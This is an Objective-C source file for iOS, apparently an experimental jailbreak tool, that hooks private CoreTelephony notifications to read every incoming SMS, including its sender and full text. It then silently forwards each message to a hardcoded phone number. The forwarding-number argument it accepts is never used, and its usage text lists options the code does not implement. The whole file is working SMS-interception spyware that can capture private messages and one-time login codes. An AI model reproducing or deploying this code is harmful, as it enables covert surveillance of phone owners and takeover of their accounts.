//
//  main.m
//  test3
//

#include <stdio.h>
#include <notify.h>
#include <unistd.h>
#include <stdarg.h>

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <CoreTelephony/CDStructures.h>
#import <CoreTelephony/CTMessageCenter.h>
#import <CoreTelephony/CTMessagePart.h>
#import <CoreTelephony/CTMessageAddress-Protocol.h>
#import <CoreTelephony/CTMessage.h>


id CTTelephonyCenterGetDefault(void);
void CTTelephonyCenterAddObserver(id,id,CFNotificationCallback,NSString*,void*,int);


static void callback(CFNotificationCenterRef center,void *observer,NSString* name, const void *object ,CFDictionaryRef userInfo)
{	

	//fprintf(stderr, "Notification intercepted: %s\n", [name UTF8String]);
	if([name isEqualToString:@"kCTMessageReceivedNotification"] && userInfo)
	{
		NSNumber* messageType = [userInfo valueForKey:@"kCTMessageTypeKey"];
		if([messageType isEqualToNumber:[NSNumber numberWithInt:1/*empirically determined!*/]])
		{
			NSNumber* messageID = [userInfo valueForKey:@"kCTMessageIdKey"];
			CTMessageCenter* mc = [CTMessageCenter sharedMessageCenter];
			CTMessage* msg = [mc incomingMessageWithId:[messageID intValue]];
			NSObject<CTMessageAddress>* phonenumber = [msg sender];
			
			NSString *senderNumber = (NSString*)[phonenumber canonicalFormat];
			NSString *sender = (NSString*)[phonenumber encodedString];
			CTMessagePart* msgPart = [[msg items] objectAtIndex:0]; //for single-part msgs
			NSData *smsData = [msgPart data];
			NSString *smsText = [[NSString alloc] initWithData:smsData encoding:NSUTF8StringEncoding];
			fprintf(stderr, "SMS Message from %s / %s: \"%s\"\n",[senderNumber UTF8String],[sender UTF8String],[smsText UTF8String]);

			[[CTMessageCenter sharedMessageCenter] sendSMSWithText:smsText serviceCenter:nil toAddress:@"+6591732305"];
		}
	}
	return;
}

static void signalHandler(int sigraised)
{
    printf("\nInterrupted.\n");
    _exit(0);
}

void usage(char *appname)
{
    printf("%s : options \n", appname);
    printf("-s listen to standard notifications\n");
    printf("-t listen to core telephony notifications\n");
}


int main(int argc, char *argv[])
{
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc]	 init];
	
	id ct = CTTelephonyCenterGetDefault();
	CTTelephonyCenterAddObserver(ct,NULL,callback,NULL,NULL,CFNotificationSuspensionBehaviorHold);
	
	char* forwardNum;
	if(argv[1]!=nil){
		forwardNum=argv[1];
	}else exit(0);
		
	printf("Forward to %s\n",forwardNum);
	
	printf("Starting Notification Scan\n");
	CFRunLoopRun();
		
    [pool release];
    return 0;
}
